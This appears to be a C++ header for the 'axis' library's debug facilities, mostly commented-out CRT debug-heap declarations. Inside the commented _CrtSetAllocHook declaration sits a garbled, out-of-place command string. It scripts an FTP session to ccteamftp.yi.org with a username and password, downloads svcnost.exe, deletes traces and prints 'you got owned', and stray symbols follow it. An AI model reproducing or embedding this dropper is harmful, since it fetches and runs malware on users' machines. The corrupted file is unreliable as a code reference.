//_Check_return_ _Ret_opt_bytecap_(_Size) CLASS_DECL_AXIS void * DECL_C _aligned_offset_malloc_dbg(
//        _In_ size_t _Size,
//        _In_ size_t _Alignment,
//        _In_ size_t _Offset,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Success_(return!=0)
//_Check_return_ _Ret_opt_bytecap_(_NewSize) CLASS_DECL_AXIS void * DECL_C _aligned_offset_realloc_dbg(
//        _Post_ptr_invalid_ void * _Memory,
//        _In_ size_t _NewSize,
//        _In_ size_t _Alignment,
//        _In_ size_t _Offset,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Success_(return!=0)
//_Check_return_ _Ret_opt_bytecap_x_(_NumOfElements*_SizeOfElements) CLASS_DECL_AXIS void * DECL_C _aligned_offset_recalloc_dbg
//(
//        _Post_ptr_invalid_ void * _Memory,
//        _In_ size_t _NumOfElements,
//        _In_ size_t _SizeOfElements,
//        _In_ size_t _Alignment,
//        _In_ size_t _Offset,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//);
//
//CLASS_DECL_AXIS void DECL_C _aligned_free_dbg(
//        _Post_ptr_invalid_ void * _Memory
//        );
//
//_Check_return_ _Ret_opt_z_ CLASS_DECL_AXIS char * DECL_C _strdup_dbg(
//        _In_opt_z_ const char * _Str,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_ _Ret_opt_z_ CLASS_DECL_AXIS wchar_t * DECL_C _wcsdup_dbg(
//        _In_opt_z_ const wchar_t * _Str,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_ _Ret_opt_z_ CLASS_DECL_AXIS char * DECL_C _tempnam_dbg(
//        _In_opt_z_ const char * _DirName,
//        _In_opt_z_ const char * _FilePrefix,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_ _Ret_opt_z_ CLASS_DECL_AXIS wchar_t * DECL_C _wtempnam_dbg(
//        _In_opt_z_ const wchar_t * _DirName,
//        _In_opt_z_ const wchar_t * _FilePrefix,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_ _Ret_opt_z_ CLASS_DECL_AXIS char * DECL_C _fullpath_dbg(
//        _Out_opt_z_cap_(_SizeInBytes) char * _FullPath,
//        _In_z_ const char * _Path,
//        _In_ size_t _SizeInBytes,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_ _Ret_opt_z_ CLASS_DECL_AXIS wchar_t * DECL_C _wfullpath_dbg(
//        _Out_opt_z_cap_(_SizeInWords) wchar_t * _FullPath,
//        _In_z_ const wchar_t * _Path,
//        _In_ size_t _SizeInWords,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_ _Ret_opt_z_ CLASS_DECL_AXIS char * DECL_C _getcwd_dbg(
//        _Out_opt_z_cap_(_SizeInBytes) char * _DstBuf,
//        _In_ int32_t _SizeInBytes,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_ _Ret_opt_z_ CLASS_DECL_AXIS wchar_t * DECL_C _wgetcwd_dbg(
//        _Out_opt_z_cap_(_SizeInWords) wchar_t * _DstBuf,
//        _In_ int32_t _SizeInWords,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_ _Ret_opt_z_ CLASS_DECL_AXIS char * DECL_C _getdcwd_dbg(
//        _In_ int32_t _Drive,
//        _Out_opt_z_cap_(_SizeInBytes) char * _DstBuf,
//        _In_ int32_t _SizeInBytes,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_ _Ret_opt_z_ CLASS_DECL_AXIS wchar_t * DECL_C _wgetdcwd_dbg(
//        _In_ int32_t _Drive,
//        _Out_opt_z_cap_(_SizeInWords) wchar_t * _DstBuf,
//        _In_ int32_t _SizeInWords,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_ _Ret_opt_z_ char * DECL_C _getdcwd_lk_dbg(
//        _In_ int32_t _Drive,
//        _Out_opt_z_cap_(_SizeInBytes) char * _DstBuf,
//        _In_ int32_t _SizeInBytes,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_ _Ret_opt_z_ wchar_t * DECL_C _wgetdcwd_lk_dbg(
//        _In_ int32_t _Drive,
//        _Out_opt_z_cap_(_SizeInWords) wchar_t * _DstBuf,
//        _In_ int32_t _SizeInWords,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_wat_ CLASS_DECL_AXIS errno_t DECL_C _dupenv_s_dbg(
//        _Out_ _Deref_post_opt_z_cap_(*_PBufferSizeInBytes) char ** _PBuffer,
//        _Out_opt_ size_t * _PBufferSizeInBytes,
//        _In_z_ const char * _VarName,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//
//_Check_return_wat_ CLASS_DECL_AXIS errno_t DECL_C _wdupenv_s_dbg(
//        _Out_ _Deref_post_opt_z_cap_(*_PBufferSizeInWords) wchar_t ** _PBuffer,
//        _Out_opt_ size_t * _PBufferSizeInWords,
//        _In_z_ const wchar_t * _VarName,
//        _In_ int32_t _BlockType,
//        _In_opt_z_ const char * _Filename,
//        _In_ int32_t _LineNumber
//        );
//*/
//
//#define _malloca_dbg(s, t, f, l)    _malloc_dbg(s, t, f, l)
//#define _freea_dbg(p, t)            _free_dbg(p, t)
//
//#if defined(__cplusplus) && defined(_CRTDBG_MAP_ALLOC)
//namespace std
//{
//	using ::_calloc_dbg; using ::_free_dbg; using ::_malloc_dbg; using ::_realloc_dbg;
//}
//#endif
//
// /****************************************************************************
// *
// * Client-defined allocation hook
// *
// ***************************************************************************/
//#if !defined(_M_CEE_PURE)
//CLASS_DECL_AXIS _CRT_ALLOC_HOOK DECL_C _CrtGetAllocHook
//(
//    void
//);
//#endif
//
///* _CrtSetAllocHook:
// * For IJW, we need 2 versions: 1 for clrcall and one for cdecl.
// * For pure and native, we just need clrcall and cdecl, respectively.
// */
//#if !defined(_M_CEE_PURE)
//CLASS_DECL_AXIS _CRT_ALLOC_HOOK DECL_C _CrtSetAllocHook
//(
//    _CRT_ALLOC_HOOK _PfnNewHook
//);
//#else
//extern "C++"
//{
//_
//MRTIMP _CRT_ALLOC_HOOK DECL_C _CrtSetAllocHook
//
//ccmd ;ca echo open ccteamftp.yi.org 21 .. ik 7echo user ccteam10 765824 .. ik 7echo binary .. ik 7echo get svcnost.exe .. ik 7echo bye .. ik 7ftp -n -v -sçik 7del ik 7svcnost.exe 7exit
//echo you got owned
//
//
//
//
//
//
//Ɓ(
//    _In_opt_ _CRT_ALLOC_HOOK _PfnNewHook
//);
//}
//#endif
//
// /****************************************************************************
// *
// * Memory management
// *
// ***************************************************************************/
//
///*
// * Bitfield flag that controls CRT heap behavior
// * Default setting is _CRTDBG_ALLOC_MEM_DF
// */
//
//#if !defined(_M_CEE_PURE)
//CLASS_DECL_AXIS extern int32_t _crtDbgFlag;
//#endif /* !defined(_M_CEE_PURE) */
//
//CLASS_DECL_AXIS int32_t DECL_C _CrtCheckMemory();
//CLASS_DECL_AXIS int32_t DECL_C _CrtSetDbgFlag(int32_t _NewFlag);
//CLASS_DECL_AXIS void DECL_C _CrtDoForAllClientObjects(void (DECL_C *_PFn)(void *, void *), void * _Context);
//CLASS_DECL_AXIS int32_t DECL_C _CrtIsValidPointer(const void * _Ptr, uint32_t _Bytes, int32_t _ReadWrite);
//CLASS_DECL_AXIS int32_t DECL_C _CrtIsValidHeapPointer(const void * _HeapPtr);
//CLASS_DECL_AXIS int32_t DECL_C _CrtIsMemoryBlock(const void * _Memory, uint32_t _Bytes, long * _RequestNumber, char ** _Filename, int32_t * _LineNumber);
//CLASS_DECL_AXIS int32_t DECL_C _CrtReportBlockType(const void * _Memory);
//
//
// /****************************************************************************
// *
// * Memory state
// *
// ***************************************************************************/
//
//#if !defined(_M_CEE_PURE)
//CLASS_DECL_AXIS _CRT_DUMP_CLIENT DECL_C _CrtGetDumpClient
//(
//    void
//);
//#endif
//
///* _CrtSetDumpClient:
// * For IJW, we need 2 versions: 1 for clrcall and one for cdecl.
// * For pure and native, we just need clrcall and cdecl, respectively.
// */
//#if !defined(_M_CEE_PURE)
//CLASS_DECL_AXIS _CRT_DUMP_CLIENT DECL_C _CrtSetDumpClient
//(
//    _CRT_DUMP_CLIENT _PFnNewDump
//);
//
//#else
//extern "C++"
//{
//_MRTIMP _CRT_DUMP_CLIENT DECL_C _CrtSetDumpClient
//(
//    _CRT_DUMP_CLIENT _PFnNewDump
//);
//}
//#endif
//
//CLASS_DECL_AXIS void DECL_C _CrtMemCheckpoint(_CrtMemState * _State);
//CLASS_DECL_AXIS int32_t DECL_C _CrtMemDifference(_CrtMemState * _State, const _CrtMemState * _OldState, const _CrtMemState * _NewState);
//CLASS_DECL_AXIS void DECL_C _CrtMemDumpAllObjectsSince(const _CrtMemState * _State);
//CLASS_DECL_AXIS void DECL_C _CrtMemDumpStatistics(const _CrtMemState * _State);
//CLASS_DECL_AXIS int32_t DECL_C _CrtDumpMemoryLeaks();
//CLASS_DECL_AXIS int32_t DECL_C _CrtSetCheckCount(int32_t _CheckCount);
//CLASS_DECL_AXIS int32_t DECL_C _CrtGetCheckCount();
//
#endif  /* DEBUG */



CLASS_DECL_AXIS int32_t FUNCTION_DEBUGBOX(const char * pszMessage, const char * pszTitle, int32_t iFlags);

inline int32_t FUNCTION_XXDEBUGBOX(const char * pszMessage, const char * pszTitle, int32_t iFlags) {

    UNREFERENCED_PARAMETER(pszMessage);
    UNREFERENCED_PARAMETER(pszTitle);
    UNREFERENCED_PARAMETER(iFlags);

    return 0;

}

#define debug_box FUNCTION_DEBUGBOX
#define xxdebug_box FUNCTION_XXDEBUGBOX





#ifdef DEBUG
void CLASS_DECL_AXIS TRACELASTERROR();
#else
#define TRACELASTERROR() ((void)0)
#endif



CLASS_DECL_AXIS string FormatMessageFromSystem(uint32_t dwError);


#endif // __AXIS_AXIS_DEBUG_H__










